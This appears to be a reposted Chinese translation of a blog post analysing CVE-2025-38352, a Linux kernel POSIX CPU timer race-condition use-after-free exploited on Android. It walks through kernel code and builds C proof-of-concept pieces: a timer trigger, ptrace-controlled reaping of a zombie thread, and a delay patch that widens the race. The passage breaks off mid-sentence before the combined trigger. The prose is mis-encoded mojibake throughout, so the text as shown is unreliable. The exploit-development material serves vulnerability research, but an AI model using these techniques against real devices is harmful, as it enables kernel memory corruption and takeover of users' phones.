#  CVE-2025-38352 Part 1 - åœ¨é‡åˆ©ç”¨çš„ Android Kernel ç«äº‰ UAF åˆ†æä¸ PoC  
Faraz
                    Faraz  securitainment   2026-01-26 02:24  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">åŸæ–‡é“¾æ¥</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">ä½œè€…</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://faith2dxy.xyz/2025-12-22/cve_2025_38352_analysis/</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">Faraz</span></section></td></tr></tbody></table>  
CVE-2025-38352 æ˜¯ Linux kernel çš„ POSIX CPU timers å®ç°ä¸­çš„ä¸€ä¸ªç«äº‰æ¡ä»¶ use-after-free æ¼æ´ï¼Œæ®æŠ¥é“å·²åœ¨é‡å¤–é­åˆ°Â æœ‰é™ã€å®šå‘  
çš„åˆ©ç”¨ï¼š  
  
![2025 å¹´ 9 æœˆ Android Bulletin](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOej62ceNicv24nRx6jMuFdtMV3KCRbhK8jd3lxDcyuBc9YcT6WGiaCZ334Awx6f9PiconDzdr6FGEWw/640?wx_fmt=png&from=appmsg "2025 å¹´ 9 æœˆ Android Bulletin")  
  
è¿™é¡¹æ¼æ´çš„åˆ†æå·²ç»ç”± @streypaws å‘å¸ƒã€‚ä»–ä»¬çš„åšå®¢å¾ˆå¥½åœ°è§£é‡Šäº† POSIX CPU timers çš„å·¥ä½œæ–¹å¼ï¼Œä»¥åŠè§¦å‘è¯¥æ¼æ´æ‰€éœ€çš„æ¡ä»¶ã€‚é“¾æ¥å¦‚ä¸‹ï¼š  
  
https://streypaws.github.io/posts/Race-Against-Time-in-the-Kernel-Clockwork/  
  
ç”±äºä»–ä»¬çš„åšå®¢æ²¡æœ‰æä¾›ä¸€ä¸ªå¯è§¦å‘æ¼æ´çš„ PoC ç¨‹åºï¼Œæˆ‘å†³å®šæŠŠå‘¨æ—¥æ™šä¸Šå˜æˆå­¦ä¹ ä¹‹å¤œï¼Œè‡ªå·±å†™ä¸€ä¸ªã€‚  
  
æœ¬æ–‡ç®€è¦å±•ç¤ºäº†æˆ‘åˆ†ææ¼æ´ä¸ç¼–å†™ PoC çš„æ€è·¯ï¼Œä¹Ÿæƒ³è¯´æ˜è¿™ç§æ–¹æ³•å¯¹å­¦ä¹ æ–°ä¸œè¥¿æœ‰å¤šä¹ˆæœ‰ä»·å€¼ã€‚  
## PoC  
  
å¦‚æœä½ åªæƒ³ç›´æ¥çœ‹ PoCï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼š  
  
https://github.com/farazsth98/poc-CVE-2025-38352  
## è¡¥ä¸æäº¤  
  
è¡¥ä¸æäº¤é“¾æ¥ï¼š  
  
https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=f90fff1e152dedf52b932240ebbd670d83330eca  
## æµ‹è¯•ç¯å¢ƒ TL;DR  
### Kernel ç‰ˆæœ¬  
  
æˆ‘ä½¿ç”¨äº† LTS kernel ç‰ˆæœ¬ 6.12.33ï¼Œå› ä¸ºå®ƒæ˜¯å½“æ—¶æœ€æ–°ä¸”ä»å—è¯¥ bug å½±å“çš„ LTS ç‰ˆæœ¬ã€‚  
### CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
  
è¡¥ä¸æäº¤ä¸­æåˆ°ï¼šå¦‚æœå¯ç”¨äº†Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
ï¼Œè¯¥æ¼æ´æ— æ³•è¢«è§¦å‘ã€‚  
  
@streypaws çš„åšå®¢æåˆ°ä»–ä»¬æ— æ³•å…³é—­Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
æ ‡å¿—ã€‚åŸå› æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªå®šä¹‰åœ¨Â kernel/time/Kconfig  
ä¸­çš„å†…éƒ¨é€‰é¡¹ (link)  
```
config HAVE_POSIX_CPU_TIMERS_TASK_WORKboolconfig POSIX_CPU_TIMERS_TASK_WORKbooldefaultÂ yÂ ifÂ POSIX_TIMERS && HAVE_POSIX_CPU_TIMERS_TASK_WORK
```  
  
å¹¶ä¸”Â HAVE_POSIX_CPU_TIMERS_TASK_WORK  
åœ¨Â arch/x86/Kconfig  
å’ŒÂ arch/arm64/Kconfig  
ä¸­éƒ½è¢«è®¾ç½®äº†ã€‚å› æ­¤ï¼Œè¯¥æ¼æ´å®é™…ä¸Šåªåœ¨ 32-bit Android è®¾å¤‡ä¸Šå¯åˆ©ç”¨ï¼Œè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå®ƒè¢«æè¿°ä¸ºåœ¨é‡å¤–é­åˆ°Â æœ‰é™ã€å®šå‘  
çš„åˆ©ç”¨ã€‚  
  
ä¸ºäº†èƒ½å¤Ÿå…³é—­å®ƒï¼Œéœ€è¦åœ¨Â kernel/time/Kconfig  
ä¸­å¯¹Â POSIX_CPU_TIMERS_TASK_WORK  
åšå¦‚ä¸‹ä¿®æ”¹ï¼š  
```
config POSIX_CPU_TIMERS_TASK_WORKbool"CVE-2025-38352: POSIX_CPU_TIMERS_TASK_WORK toggle"ifÂ EXPERTÂ depends on POSIX_TIMERS && HAVE_POSIX_CPU_TIMERS_TASK_WORKdefaultÂ yÂ helpÂ  Â For CVE-2025-38352Â analysis.
```  
  
ç°åœ¨ï¼Œä½ å°±å¯ä»¥é€šè¿‡Â make menuconfig  
æ¥åˆ‡æ¢è¯¥é€‰é¡¹ã€‚  
  
ä½œä¸ºå‚è€ƒï¼Œæˆ‘ä»¥ kernelCTF LTS config (link) ä¸ºåŸºåº•ï¼Œåªåšäº†ä¸Šè¿°ä¿®æ”¹ï¼Œä»¥ä¾¿èƒ½å¤Ÿå…³é—­Â CONFIG_POSIX_CPU_TIMERS_TASK_WORK  
ã€‚  
  
æˆ‘è¿˜åœ¨Â make menuconfig  
ä¸­å¯ç”¨äº† full preemption (åœ¨èœå•ä¸­æœç´¢Â PREEMPT  
)ï¼Œå› ä¸º Android kernel é»˜è®¤å¼€å¯äº†å®ƒã€‚  
### QEMU é…ç½®  
  
ç”±äºè¿™æ˜¯ä¸€ä¸ªç«äº‰æ¡ä»¶ï¼Œè‡³å°‘éœ€è¦ä¸¤é¢— CPU æ‰èƒ½è§¦å‘ã€‚æˆ‘çš„æµ‹è¯•ä½¿ç”¨äº† 4 vCPU çš„ QEMU VM:  
```
qemu-system-x86_64Â \Â  Â  -enable-kvmÂ \Â  Â  -cpu hostÂ \Â  Â  -smp cores=4Â \# [ ... ]
```  
## æ¼æ´å›é¡¾  
  
å¼ºçƒˆå»ºè®®ä½ åœ¨ç»§ç»­ä¹‹å‰å…ˆé˜…è¯» @streypaws çš„åšå®¢ (link)ã€‚æˆ‘è¿™é‡Œåªè¡¥å……è¯¥æ–‡ä¸­ä¸â€œå¦‚ä½•è§¦å‘â€ç›¸å…³çš„éƒ¨åˆ†ã€‚  
  
æ¯å½“ per-CPU scheduler tick å‘ç”Ÿæ—¶ï¼Œkernel ä¼šåœ¨æ¯ä¸ª CPU ä¸Šè°ƒç”¨Â run_posix_cpu_timers()  
ã€‚å¦‚æœæœ‰ timer å‡†å¤‡è§¦å‘ï¼Œè¯¥å‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨Â handle_posix_cpu_timers()  
ã€‚  
  
è¯¥æ¼æ´ä¹‹æ‰€ä»¥å‡ºç°ï¼Œæ˜¯å› ä¸ºå³ä¾¿ task å·²ç»å˜æˆ zombie (ä¹Ÿå°±æ˜¯ task çš„Â tsk->exit_state  
è¢«è®¾ç½®ä¸ºÂ EXIT_ZOMBIE  
)ï¼Œhandle_posix_cpu_timers()  
ä»ç„¶å…è®¸æ‰§è¡Œã€‚  
  
æˆ‘ä»¬å…ˆå¿«é€Ÿçœ‹ä¸€ä¸‹Â handle_posix_cpu_timers()  
ï¼Œä»¥ä¾¿ç†è§£æ¼æ´çš„å…³é”®ç‚¹ï¼š  
```
staticvoidhandle_posix_cpu_timers(structÂ task_struct *tsk){structÂ k_itimer *timer, *next;unsignedlongÂ flags, start;LIST_HEAD(firing);Â // Faith: local list of timers// Faith: acquire tsk->sighand->siglockifÂ (!lock_task_sighand(tsk, &flags))return;doÂ {// [ 1 ]// Collect all firing timers into the `firing` listcheck_thread_timers(tsk, &firing);check_process_timers(tsk, &firing);// [ ... ]Â }Â whileÂ (!posix_cpu_timers_enable_work(tsk, start));// Faith: release tsk->sighang->siglockunlock_task_sighand(tsk, &flags);// Faith: RACE WINDOW START// [ 2 ]// Faith: Iterate over the `firing` list and fire the timerslist_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {// [ ... ]// Faith: RACE WINDOW ENDs after the timer is finished being// Â  Â  Â  Â accessed.Â }}
```  
  
ç»“åˆæˆ‘åœ¨ä¸Šé¢ä»£ç ä¸­çš„æ³¨é‡Šï¼Œå¹¶å‡è®¾åªæœ‰ä¸€ä¸ªæ­£åœ¨è§¦å‘çš„ timer:  
1. åœ¨è·å–Â tsk->sighand->siglock  
ä¹‹åï¼Œå®ƒä¼šæ”¶é›†è¯¥è§¦å‘ timer å¹¶æŠŠå®ƒæ”¾è¿›æœ¬åœ°çš„Â firing  
listã€‚æ³¨æ„ï¼Œè¿™ä¸€æ­¥ä¼šæŠŠ timer ä» task ä¸Šç§»é™¤ã€‚  
  
1. timer è¢«æ”¶é›†åï¼Œä¼šé‡Šæ”¾Â tsk->sighand->siglock  
ï¼Œç„¶åå‡½æ•°éå†æœ¬åœ°Â firing  
list å¹¶è§¦å‘ timerã€‚  
  
å¦‚æœè¯¥ task æ˜¯ zombieï¼Œé‚£ä¹ˆåœ¨é‡Šæ”¾Â tsk->sighand->siglock  
ä¹‹åå°±ä¼šå‡ºç°ä¸€ä¸ªç«äº‰çª—å£ã€‚åœ¨è¿™ä¸ªçª—å£é‡Œï¼Œå¦ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åšä»¥ä¸‹ä¸¤ä»¶äº‹æ¥é‡Šæ”¾Â firing  
list ä¸­çš„ timer:  
1. **å›æ”¶ (reap) zombie task**  
â€” çˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡Â waitpid()  
æ¥å®Œæˆã€‚  
  
1. **è°ƒç”¨Â timer_delete()syscall**  
â€” è¿™ä¼šè°ƒç”¨Â posix_cpu_timer_del()  
ï¼Œå¹¶é€šè¿‡ RCU é‡Šæ”¾ timerã€‚  
  
å½“çˆ¶è¿›ç¨‹å›æ”¶ zombie task æ—¶ï¼Œä¼šå¯¹å®ƒè°ƒç”¨Â release_task()  
ï¼Œæœ€ç»ˆé€šè¿‡Â __exit_signal()  
å°†Â tsk->sighand  
ç½®ä¸ºÂ NULL  
:  
```
staticvoid__exit_signal(structÂ task_struct *tsk){// [ ... ]Â sighand =Â rcu_dereference_check(tsk->sighand,lockdep_tasklist_lock_is_held());spin_lock(&sighand->siglock);// [ ... ]Â tsk->sighand =Â NULL;Â // Faith: HEREspin_unlock(&sighand->siglock);// [ ... ]}
```  
  
éšåï¼Œå½“é€šè¿‡Â timer_delete()  
è°ƒç”¨Â posix_cpu_timer_del()  
æ—¶ï¼Œå®ƒä¼šå‘ç°Â tsk->sighand  
ä¸ºÂ NULL  
ï¼Œäºæ˜¯ç›´æ¥è¿”å› 0:  
```
staticintposix_cpu_timer_del(structÂ k_itimer *timer){// [ ... ]intÂ ret =Â 0;// [ ... ]Â sighand =Â lock_task_sighand(p, &flags);ifÂ (unlikely(sighand ==Â NULL)) {WARN_ON_ONCE(ctmr->head ||Â timerqueue_node_queued(&ctmr->node));Â }Â elseÂ {// [ ... ]Â }out:// [ ... ]returnÂ ret;}
```  
  
å½“Â posix_cpu_timer_del()  
è¿”å› 0 åï¼Œä¼šå›åˆ°Â timer_delete()  
çš„ syscall handlerï¼Œå¹¶è°ƒç”¨Â posix_timer_unhash_and_free()  
æ¥é‡Šæ”¾ timer:  
```
SYSCALL_DEFINE1(timer_delete,Â timer_t, timer_id){// [ ... ]retry_delete:// [ ... ]// Faith: timer_delete_hook() calls posix_cpu_timer_del()ifÂ (unlikely(timer_delete_hook(timer) == TIMER_RETRY)) {/* Unlocks and relocks the timer if it still exists */Â  timer =Â timer_wait_running(timer, &flags);gotoÂ retry_delete;Â }// [ ... ]posix_timer_unhash_and_free(timer);return0;}
```  
  
å®é™…çš„é‡Šæ”¾é€šè¿‡ RCU å®Œæˆï¼Œå› æ­¤ä¸ä¼šç«‹åˆ»å‘ç”Ÿï¼š  
```
staticvoidposix_timer_unhash_and_free(structÂ k_itimer *tmr){// [ ... ]posix_timer_free(tmr);}staticvoidposix_timer_free(structÂ k_itimer *tmr){// [ ... ]call_rcu(&tmr->rcu, k_itimer_rcu_free);}
```  
  
å¦‚æœä¸Šè¿°è¿‡ç¨‹éƒ½å‘ç”Ÿåœ¨å‰é¢æè¿°çš„ç«äº‰çª—å£å†…ï¼Œé‚£ä¹ˆå½“Â handle_posix_cpu_timers()  
éå†æœ¬åœ°Â firing  
list å¹¶è®¿é—®è¯¥ timer æ—¶ï¼Œå°±ä¼šè§¦å‘ UAF:  
```
staticvoidhandle_posix_cpu_timers(structÂ task_struct *tsk){// [ ... ]// Faith: Iterate over the `firing` list and fire the timerslist_for_each_entry_safe(timer, next, &firing, it.cpu.elist) {// [ ... ]// Faith: UAF occurs hereÂ }}
```  
## è§„åˆ’ PoC  
  
æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“å¦‚ä½•è§¦å‘æ¼æ´ï¼Œå°±ä¸€æ­¥æ­¥è§„åˆ’ä¸€ä¸ª PoCã€‚  
### æœ€å°åŒ– POSIX CPU Timer PoC  
  
é¦–å…ˆæˆ‘ä»¬éœ€è¦èƒ½è®©ä»£ç è·¯å¾„è¿›å…¥Â handle_posix_cpu_timers()  
ã€‚ä¸‹é¢è¿™ä¸ªæœ€å° PoC å¯ä»¥åšåˆ°ï¼š  
```
#include<time.h>#include<signal.h>#include<stdio.h>#include<unistd.h>voidtimer_fire(void) {printf("Timer fired\n");}intmain(void) {structsigeventÂ sev = {0};Â  Â  sev.sigev_notifyÂ = SIGEV_THREAD;Â  Â  sev.sigev_notify_functionÂ = (voidÂ (*)(sigval_t))timer_fire;timer_tÂ timer;intÂ timerfd =Â timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer);printf("Timer created:Â %d\n", timerfd);structÂ itimerspec ts = {Â  Â  Â  Â  .it_intervalÂ = {0,Â 0},Â  Â  Â  Â  .it_valueÂ = {1,Â 0},Â  Â  };timer_settime(timer,Â 0, &ts,Â NULL);printf("Timer started:Â %d\n", timerfd);// Use up CPU time to fire the timerwhileÂ (1);}
```  
1. timer_create()  
ç”¨äºåˆ›å»ºä¸€ä¸ª POSIX CPU timerï¼Œåœ¨è§¦å‘æ—¶è°ƒç”¨Â timer_fire()  
ã€‚  
  
1. timer_settime()  
å°† timer è®¾ç½®ä¸ºåœ¨å½“å‰ thread æ¶ˆè€— 1 ç§’ CPU time åè§¦å‘ã€‚  
  
### åˆ›å»º Zombie Task  
  
ä¸ºäº†ç†è§£å¦‚ä½•æŠŠä¸€ä¸ª task è½¬æ¢åˆ°Â EXIT_ZOMBIE  
é€€å‡ºçŠ¶æ€ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Â exit_notify()  
ï¼šå½“çº¿ç¨‹/è¿›ç¨‹è¿è¡Œç»“æŸå¹¶é€€å‡ºæ—¶ï¼Œå®ƒä¼šé€šè¿‡Â do_exit()  
è°ƒç”¨Â exit_notify()  
:  
```
staticvoidexit_notify(structÂ task_struct *tsk,Â intÂ group_dead){// [ ... ]LIST_HEAD(dead);// [ ... ]Â tsk->exit_state = EXIT_ZOMBIE;Â // [ 1 ]// [ ... ]// [ 2 ]ifÂ (unlikely(tsk->ptrace)) {intÂ sig =Â thread_group_leader(tsk) &&thread_group_empty(tsk) &&Â  Â  !ptrace_reparented(tsk) ?Â  Â tsk->exit_signal : SIGCHLD;Â  autoreap =Â do_notify_parent(tsk, sig);Â }// [ ... ]// [ 3 ]ifÂ (autoreap) {Â  tsk->exit_state = EXIT_DEAD;list_add(&tsk->ptrace_entry, &dead);Â }// [ ... ]// [ 4 ]list_for_each_entry_safe(p, n, &dead, ptrace_entry) {list_del_init(&p->ptrace_entry);release_task(p);Â }}
```  
  
ç»“åˆä¸Šé¢ä»£ç é‡Œçš„æ ‡æ³¨ï¼š  
1. task çš„ exit state åˆå§‹ä¼šè¢«è‡ªåŠ¨è®¾ç½®ä¸ºÂ EXIT_ZOMBIE  
ã€‚  
  
1. å¦‚æœ task å½“å‰æ­£è¢« ptraceï¼Œautoreap  
ä¼šè¢«è®¾ç½®ä¸ºÂ do_notify_parent()  
çš„è¿”å›å€¼ã€‚  
  
1. åªè¦çˆ¶è¿›ç¨‹ä¸å¿½ç•¥Â SIGCHLD  
signalsï¼Œdo_notify_parent()  
å°±ä¼šè¿”å› falseã€‚  
  
1. å¦‚æœÂ autoreap  
ä¸º trueï¼Œtask çš„ exit state ä¼šæ”¹ä¸ºÂ EXIT_DEAD  
ï¼Œå¹¶è¢«åŠ å…¥æœ¬åœ°Â dead  
listã€‚  
  
1. éå†æœ¬åœ°Â dead  
listï¼Œå¯¹å…¶ä¸­æ¯ä¸ª task è°ƒç”¨Â release_task()  
ã€‚  
  
æ ¹æ®ä¸Šä¸€èŠ‚åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“Â release_task()  
ä¼šæŠŠÂ tsk->sighand  
ç½®ä¸ºÂ NULL  
ã€‚  
  
ä½†æˆ‘ä»¬å¸Œæœ›Â handle_posix_cpu_timers()  
èƒ½é”ä½Â tsk->sighand->siglock  
ï¼Œå¹¶æŠŠæˆ‘ä»¬çš„ firing timer æ”¶é›†è¿›æœ¬åœ°Â firing  
listï¼Œå› æ­¤è¿™é‡Œä¸å¸Œæœ› task è¢« releaseã€‚  
  
å› æ­¤ï¼Œè¦åœ¨è¿™é‡Œåˆ¶é€ ä¸€ä¸ª zombie taskï¼Œå¿…é¡»è®©Â tsk->ptrace  
è¢«è®¾ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦æœ‰ä¸€ä¸ªçˆ¶è¿›ç¨‹åœ¨ ptrace è¿™ä¸ª taskã€‚åŒæ—¶çˆ¶è¿›ç¨‹å¿…é¡»ä¸èƒ½å¿½ç•¥Â SIGCHLD  
signalsã€‚  
### å›æ”¶ Zombie Task  
  
åœ¨ threads ä¸ processes çš„è¯­å¢ƒä¸‹ï¼Œ"reaping" æŒ‡çš„æ˜¯å®Œå…¨é‡Šæ”¾å¹¶å›æ”¶ä¸€ä¸ª task (ä¸»è¦æ˜¯ä¸ºå…¶åˆ†é…çš„ task_struct)ã€‚é€šå¸¸å›æ”¶çš„æœ€åä¸€æ­¥ï¼Œæ˜¯è®© kernel å¯¹è¯¥ task è°ƒç”¨Â release_task()  
ã€‚  
  
åœ¨çˆ¶ ptracer è¿›ç¨‹ä¸­è°ƒç”¨Â waitpid(zombie_task_pid, ...)  
å¯ä»¥å›æ”¶ zombie taskã€‚æˆ‘ä»¬å¸Œæœ›èµ°åˆ°çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š  
```
do_wait()-> __do_wait()-> do_wait_pid()-> wait_consider_task()-> wait_task_zombie()-> release_task()
```  
  
è¿™æ¡è°ƒç”¨æ ˆæ¶‰åŠçš„ä»£ç å¤ªå¤šï¼Œä¸ä¾¿å®Œæ•´å±•ç¤ºã€‚ä¸ºäº†æˆåŠŸå›æ”¶ zombie task å¹¶è®© kernel è°ƒç”¨Â release_task()  
ï¼Œæˆ‘ä»¬éœ€è¦æ»¡è¶³ä»¥ä¸‹å…³é”®æ¡ä»¶ï¼š  
1. åªæœ‰å½“æˆ‘ä»¬æŒ‡å®šçš„æ˜¯ PID (è€Œä¸æ˜¯ TGIDã€PGID ç­‰) æ—¶ï¼Œæ‰ä¼šèµ°åˆ°Â do_wait_pid()  
ã€‚  
  
1. åªæœ‰æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰ä¼šè°ƒç”¨Â wait_task_zombie()  
:  
  
1. zombie task æ­£åœ¨è¢« ptraceã€‚  
  
1. zombie task ä¸æ˜¯å½“å‰ thread group leader (é»˜è®¤æƒ…å†µä¸‹ï¼Œthread group leader æ˜¯è¿›ç¨‹çš„ä¸»çº¿ç¨‹)ã€‚  
  
è¦æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œzombie task å¿…é¡»æ˜¯è¢«çˆ¶è¿›ç¨‹ ptrace çš„æŸä¸ªè¿›ç¨‹ä¸­çš„éä¸»çº¿ç¨‹ã€‚  
  
å¦å¤–ï¼Œçˆ¶è¿›ç¨‹å¿…é¡»æŠŠ zombie task çš„ thread ID (æœ¬è´¨å°±æ˜¯ä¸€ä¸ª PID) ä¼ ç»™Â waitpid()  
ï¼Œè¿™æ„å‘³ç€å­è¿›ç¨‹éœ€è¦ä»¥æŸç§æ–¹å¼æŠŠè¯¥ thread ID å‘Šè¯‰çˆ¶è¿›ç¨‹ã€‚  
### å¯æ§åœ°å›æ”¶ Zombie Task  
  
ä¸‹é¢è¿™ä¸ª PoC æ¼”ç¤ºäº†ä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼Œå¦‚ä½•å®Œå…¨æ§åˆ¶â€œä½•æ—¶å›æ”¶â€å­è¿›ç¨‹ä¸­çš„éä¸»çº¿ç¨‹ï¼š  
```
#define_GNU_SOURCE#include<stdio.h>#include<pthread.h>#include<sys/ptrace.h>#include<sys/wait.h>#include<err.h>#include<sys/prctl.h>#include<sys/syscall.h>#defineSYSCHK(x) ({ Â  Â  Â  Â  Â  Â \typeof(x) __res = (x); Â  Â  Â \ifÂ (__res == (typeof(x))-1) \err(1,Â "SYSCHK("Â #xÂ ")"); \Â  Â  __res; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â \})voidpin_on_cpu(intÂ i) {cpu_set_tÂ mask;CPU_ZERO(&mask);CPU_SET(i, &mask);sched_setaffinity(0,Â sizeof(mask), &mask);}pthread_tÂ reapee_thread;pthread_barrier_tÂ barrier;intÂ c2p[2];Â // child to parentintÂ p2c[2];Â // parent to childvoidreapee(void) {pin_on_cpu(2);prctl(PR_SET_NAME,Â "REAPEE");// Send this thread's TID to the parent processpid_tÂ tid = (pid_t)syscall(SYS_gettid);SYSCHK(write(c2p[1], &tid,Â sizeof(pid_t)));// Wait for the parent to attachpthread_barrier_wait(&barrier);return;}intmain(intÂ argc,Â charÂ *argv[]) {// Parent and child setup// Use pipes to communicate between parent and childSYSCHK(pipe(c2p));SYSCHK(pipe(p2c));pid_tÂ pid =Â SYSCHK(fork());ifÂ (pid) {// parentpin_on_cpu(1);charÂ m;close(c2p[1]);close(p2c[0]);// Receive child process's REAPEE thread'sTIDpid_tÂ tid;SYSCHK(read(c2p[0], &tid,Â sizeof(pid_t)));printf("Parent: reapee thread ID:Â %d\n", tid);// Attach to the REAPEE thread and continue itprintf("Parent: attaching to REAPEE thread\n");SYSCHK(ptrace(PTRACE_ATTACH, tid,Â NULL,Â NULL));SYSCHK(waitpid(tid,Â NULL, __WALL));SYSCHK(ptrace(PTRACE_CONT, tid,Â NULL,Â NULL));// Signal to child that we attached and continuedSYSCHK(write(p2c[1], &m,Â 1));// Reap the REAPEE thread nowprintf("Parent: press enter to reap REAPEE thread\n");getchar();SYSCHK(waitpid(tid,Â NULL, __WALL));printf("Parent: detached from REAPEE\n");sleep(5);Â  Â  }Â elseÂ {// childpin_on_cpu(0);charÂ m;close(c2p[0]);close(p2c[1]);prctl(PR_SET_NAME,Â "CHILD_MAIN");pthread_barrier_init(&barrier,Â NULL,Â 2);pthread_create(&reapee_thread,Â NULL, (void*)reapee,Â NULL);printf("Thread created\n");// Parent process writes to us when attached and continued, use// a barrier to continue the REAPEE thread nowSYSCHK(read(p2c[0], &m,Â 1));pthread_barrier_wait(&barrier);pause();Â  Â  }}
```  
  
è¿è¡Œè¯¥ PoC æ—¶ï¼Œåœ¨è§‚å¯Ÿåˆ°ä»¥ä¸‹è¾“å‡ºåï¼Œå°† GDB attach åˆ° kernel:  
```
Thread createdParent: reapee thread ID: 152Parent: attaching to REAPEE threadParent: press enter to reap REAPEE thread
```  
  
åœ¨ GDB ä¸­ï¼Œå¯¹Â release_task()  
ä¸‹æ–­ç‚¹å¹¶ç»§ç»­æ‰§è¡Œã€‚ä½ å¯ä»¥åœ¨ä»»æ„æ—¶åˆ»æŒ‰å›è½¦è§¦å‘Â release_task()  
:  
```
gef> p p->comm$1Â =Â "REAPEE\000\000\000\000\000\000\000\000\000"gef> bt#0release_taskÂ (p=p@entry=0xffff88800892d280) at kernel/exit.c:245#10xffffffff811a549fÂ inÂ wait_task_zombieÂ (p=0xffff88800892d280, wo=0xffffc90000627eb0) at kernel/exit.c:1254#2wait_consider_taskÂ (wo=wo@entry=0xffffc90000627eb0, ptrace=<optimized out>, ptrace@entry=0x1, p=0xffff88800892d280) at kernel/exit.c:1481#30xffffffff811a6cd6Â inÂ do_wait_pidÂ (wo=0xffffc90000627eb0) at kernel/exit.c:1629#4__do_waitÂ (wo=wo@entry=0xffffc90000627eb0) at kernel/exit.c:1655#50xffffffff811a6d86Â inÂ do_waitÂ (wo=wo@entry=0xffffc90000627eb0) at kernel/exit.c:1696
```  
  
æ³¨æ„ï¼Œrelease_task()  
ä¹Ÿä¼šå‘¨æœŸæ€§åœ°è¢«è°ƒç”¨ä»¥å›æ”¶Â kworker  
threadsã€‚é‡åˆ°è¿™ç§æƒ…å†µå¯ä»¥å¿½ç•¥å¹¶ç»§ç»­ã€‚  
## ç¼–å†™ PoC  
  
ç°åœ¨ï¼Œç»ˆäºå¯ä»¥å¼€å§‹å†™ PoC äº†ï¼  
### ç”¨ Kernel è¡¥ä¸å»¶é•¿ç«äº‰çª—å£  
  
ä¸ºäº†æ›´å®¹æ˜“è§¦å‘ bugï¼Œæˆ‘åœ¨Â handle_posix_cpu_timers()  
é‡ŒåŠ äº†ä¸€ä¸ª 500 ms å»¶è¿Ÿæ¥å»¶é•¿ç«äº‰çª—å£ã€‚è¿™èƒ½è®© PoC æ›´ç¨³å®šï¼š  
```
staticvoidhandle_posix_cpu_timers(structÂ task_struct *tsk){// [ ... ]unlock_task_sighand(tsk, &flags);// Faith: extend the race windowifÂ (strcmp(tsk->comm,Â "SLOWME") ==Â 0) {printk("Faith: Did we win? tsk->exit_state:Â %d\n", tsk->exit_state);mdelay(500);Â }// [ ... ]}
```  
  
ä½†äº‹å®è¯æ˜ï¼Œè¿™ä¸ª patchÂ å‡ ä¹  
æ˜¯å¿…éœ€çš„ã€‚æˆ‘ç¡®å®è§è¿‡è§¦å‘ä¸€ä¸¤æ¬¡ï¼Œä½†æå…¶ç½•è§ï¼ŒåŸå› æœ‰äºŒï¼š  
1. é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åªæœ‰ä¸€ä¸ª timer (ä¹Ÿæ˜¯æˆ‘ä¸‹é¢ PoC ä½¿ç”¨çš„æƒ…å†µ) æ—¶ï¼Œç«äº‰çª—å£å¤§çº¦åªæœ‰ 3000â€“4000 nsï¼Œè¦åœ¨è¿™ä¸ªçª—å£é‡ŒåŒæ—¶å‘½ä¸­ reap + free éå¸¸å›°éš¾ã€‚  
  
1. timer çš„é‡Šæ”¾ç”± RCU å¤„ç†ï¼Œå®ƒå¾ˆå¯èƒ½ä¼šèŠ±è¶…è¿‡ 4000 nsã€‚  
  
æˆ‘çŒœæˆ‘æœ‰å‡ æ¬¡åªæ˜¯è¿æ°”å¥½ï¼šæŸäº›è¯¡å¼‚è¡Œä¸ºè®©ç«äº‰çª—å£åœç•™å¾—è¶³å¤Ÿä¹…ï¼Œæ‰åŒæ—¶æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹ï¼Œä½†ç¡®å®ä¸å¯é ã€‚  
  
æƒ³çœ‹æˆ‘æ˜¯å¦‚ä½•å†™å‡ºä¸€ä¸ªä¸éœ€è¦ä¸Šè¿° delay patch çš„ PoCï¼Œè¯·çœ‹æœ¬æ–‡ Part 2!  
### è§¦å‘ç«äº‰æ¡ä»¶  
  
ä¸ºäº†è§¦å‘è¿™ä¸ªç«äº‰æ¡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦æŠŠä¸Šä¸€èŠ‚çš„ä¸¤ä¸ª PoC ç»„åˆèµ·æ¥ï¼Œå¹¶ç¡®ä¿ POSIX CPU timer çš„è§¦å‘æ—¶æœºè½åœ¨Â exit_notify()  
å°†Â tsk->exit_state  
è½¬æ¢ä¸ºÂ EXIT_ZOMBIE  
ä¹‹åã€‚  
  
è¿™å®é™…ä¸Šæ„å‘³ç€ï¼šå½“å­è¿›ç¨‹ä¸­çš„éä¸»çº¿ç¨‹é€€å‡ºæ—¶ï¼Œå¿…é¡»ç•™ä¸‹â€œåˆšåˆšå¥½â€çš„ CPU timeï¼Œè®© kernel çš„Â do_exit()  
